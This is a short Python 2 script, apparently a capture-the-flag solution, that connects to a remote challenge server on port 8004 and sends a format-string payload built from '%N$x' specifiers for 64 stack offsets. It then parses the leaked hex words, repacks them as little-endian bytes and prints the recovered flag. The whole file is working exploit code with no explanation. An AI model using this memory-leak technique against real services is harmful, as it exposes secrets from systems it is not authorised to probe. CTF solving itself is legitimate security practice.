#!/usr/bin/python

import time
import socket
import struct

host = "127.0.0.1"
host = "hack.bckdr.in"


def main():
    payload = ""
    offset = 10
    s = socket.create_connection((host, 8004))
    for i in range(0,64):
        payload += "%" + str(i+offset) + "$x"


    s.recv(1024)
    s.send(payload)
    s.recv(1024)
    s.send("lol\n")
    time.sleep(3)
    dump = s.recv(1024)
    loc = dump.find(next(c for c in dump if c not in "0123456789abcdefABCDEF"))
    dump = dump[:loc]
    if not len(dump) % 2 == 0: dump=dump[:-1]
    eggs = [dump[i:i+8] for i in range(0, len(dump), 8)]
    flag = ""
    for item in eggs:
        flag += struct.pack("<I", int(item, 16))
    loc = min(flag.find(next(c for c in flag if ord(c) not in range(32, 126))), 100)
    flag = flag[:loc]
    print flag



if __name__ == "__main__":
    main()


